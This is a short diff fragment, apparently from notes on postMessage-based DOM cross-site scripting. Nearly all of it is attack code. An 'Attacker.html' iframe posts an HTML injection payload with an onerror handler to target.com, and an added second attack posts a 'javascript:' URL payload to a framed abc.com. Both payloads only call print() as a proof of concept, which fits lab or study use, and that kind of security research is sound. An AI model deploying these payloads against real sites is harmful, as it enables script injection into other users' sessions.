@@ -4,3 +4,8 @@ window.addEventListener('message', function(e) {
 
 Attacker.html
  <iframe src="//target.com" onload="this.contentWindow.postMessage('</div><img src=xss onerror=print()>','*')"> 
+
+
+Attack2:
+
+ <iframe src="//abc.com" onload="this.contentWindow.postMessage('javascript:print();//http:','*')" width=900px height=900px> </iframe>
